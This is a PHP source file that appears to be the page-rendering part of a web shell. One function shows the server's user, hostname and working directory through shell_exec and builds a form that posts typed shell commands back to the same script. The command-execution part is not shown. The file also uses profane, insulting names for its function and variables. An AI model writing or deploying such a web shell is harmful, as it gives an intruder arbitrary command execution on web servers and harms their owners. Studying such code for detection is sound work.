<?php

function fuck_abbott($which){

	// this is a few bits of inf0 for the user, like
	// www-data@website.org:/var/www/
	$up_the_dole = shell_exec('echo "$(whoami)@$(hostname):$(pwd)"');

	// this is just the location of the script, we need this so the html form
	// knows where to submit the command, and so you when you press enter/submit,
	// you come back to the same page, and not some useless 404 page
	$putin_huilo = basename($_SERVER['SCRIPT_NAME']);

$html_top = <<< EOF
<!DOCTYPE HTML>
<html>
	<head>
		<style>
			input{background-color:#fff;width:50%;}code,input,*{font-size:12px;color:#000;font-family:"Menlo","Monaco",
			"Consolas",monospace !important;}body{background-color:#fafafa;}banana{ color:#aaa;}
		</style>
	</head>
	<body>

		$up_the_dole
	
		<form action="$putin_huilo" method="POST">
			<span>$ </span>
			<input type="text" name="whosthere" autocomplete="off" autofocus>
			<span>2&gt;&amp;1</span><br>
			<button value="Submit" name="submit" type="submit">~\$ubM1t~~&gt;</button>
		</form>
		<code>
			<pre><br><br>
EOF;
// gotta keep your html all semantic and proper and shit
$html_bottom = <<< EOF
			</pre>
		</code>
	</body>
</html>
EOF;

	if ($which == 0){
		return $html_top;
	} else {
		return $html_bottom;
	}

}

?>